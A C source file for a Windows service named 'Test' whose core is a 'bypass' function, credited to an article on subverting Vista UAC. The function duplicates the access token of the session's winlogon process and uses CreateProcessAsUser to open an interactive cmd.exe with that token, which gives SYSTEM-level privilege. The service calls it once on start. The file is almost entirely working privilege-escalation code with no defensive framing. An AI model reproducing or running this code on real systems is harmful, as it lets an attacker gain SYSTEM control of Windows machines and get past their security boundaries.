#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <wtsapi32.h>


#define UNUSED(x) (void)(x)

#define SLEEP_TIME 5000
#define LOGFILE "C:\\Users\\user\\Desktop\\ServiceExample.log"

// from: https://www.codeproject.com/Articles/35773/Subverting-Vista-UAC-in-Both-32-and-64-bit-Archite
int bypass(const char* cmd) {
	
	DWORD winlogonPid = 0;
	
	// obtain the currently active session id; every logged on user in the system has a unique session id
	DWORD dwSessionID = WTSGetActiveConsoleSessionId();
	
	// obtain the process id of the winlogon process that is running within the currently active session
	HANDLE thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE) { return 0; }
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	BOOL retval = Process32First(thSnapShot, &pe);
	while (retval) {
		
		DWORD SessionId;
		if (StrStrI(pe.szExeFile, "winlogon") != NULL && ProcessIdToSessionId(pe.th32ProcessID, &SessionId) && SessionId == dwSessionID)
		{ winlogonPid = pe.th32ProcessID;; }
		
		retval = Process32Next(thSnapShot, &pe);
	}
	CloseHandle(thSnapShot);
	
	// obtain a handle to the winlogon process
	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, winlogonPid);
	
	// obtain a handle to the access token of the winlogon process
	HANDLE hPToken;
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hPToken)) {
		CloseHandle(hProcess);
		return FALSE;
	}
	
	// copy the access token of the winlogon process; the newly created token will be a primary token
	HANDLE hUserTokenDup;
    if (!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserTokenDup)) {
        CloseHandle(hProcess);
        CloseHandle(hPToken);
        return FALSE;
    }
	
	// By default CreateProcessAsUser creates a process on a non-interactive window station, meaning
	// the window station has a desktop that is invisible and the process is incapable of receiving
	// user input. To remedy this we set the lpDesktop parameter to indicate we want to enable user 
	// interaction with the new process.
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = "winsta0\\default"; // interactive window station parameter; basically this indicates that the process created can display a GUI on the desktop
	
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	
	// flags that specify the priority and creation method of the process
	int dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;
	
	// create a new process in the current user's logon session
	int cmdl = strlen(cmd) + 1;
	char cmdc[cmdl];
	memset(cmdc, 0, cmdl);
	strcpy(cmdc, cmd);
	
	BOOL result = CreateProcessAsUser(
		hUserTokenDup,   // client's access token
		NULL,            // file to execute
		cmdc,            // command line
		NULL,            // pointer to process SECURITY_ATTRIBUTES
		NULL,            // pointer to thread SECURITY_ATTRIBUTES
		FALSE,           // handles are not inheritable
		dwCreationFlags, // creation flags
		NULL,            // pointer to new environment block 
		NULL,            // name of current directory 
		&si,             // pointer to STARTUPINFO structure
		&pi              // receives information about new process
	);
	
	// invalidate the handles
	CloseHandle(hProcess);
	CloseHandle(hPToken);
	CloseHandle(hUserTokenDup);
	
	return result;
}

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
 
void  ServiceMain(int argc, char** argv);
void  ControlHandler(DWORD request);
int InitService();

int main() {
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = "Test";
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
	
	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	// Start the control dispatcher thread for our service
	StartServiceCtrlDispatcher(ServiceTable);
	
	return 0;
}

void ServiceMain(int argc, char** argv) {
	UNUSED(argc);
	UNUSED(argv);
	
	ServiceStatus.dwServiceType        = SERVICE_WIN32;
	ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode      = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint         = 0;
	ServiceStatus.dwWaitHint           = 0;
	hStatus = RegisterServiceCtrlHandler("Test", (LPHANDLER_FUNCTION)ControlHandler);
	if (hStatus == (SERVICE_STATUS_HANDLE)0) {
		// Registering Control Handler failed
		return;
	}
	// Initialize Service 
	
	// We report the running status to SCM. 
	ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
	SetServiceStatus (hStatus, &ServiceStatus);
	
	// The worker loop of a service
	while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
		bypass("cmd.exe");
		break;
	}
	
	// stop service
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
	SetServiceStatus (hStatus, &ServiceStatus);
	return; 
}
 
// Control handler function
void ControlHandler(DWORD request) {
	switch(request) {
		case SERVICE_CONTROL_STOP:
			ServiceStatus.dwWin32ExitCode = 0;
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
			SetServiceStatus (hStatus, &ServiceStatus);
			return; 
		
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwWin32ExitCode = 0;
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
			SetServiceStatus (hStatus, &ServiceStatus);
			return;
		
		default:
			break;
	}
	
	// Report current status
	SetServiceStatus(hStatus,  &ServiceStatus);
	
	return;
} 

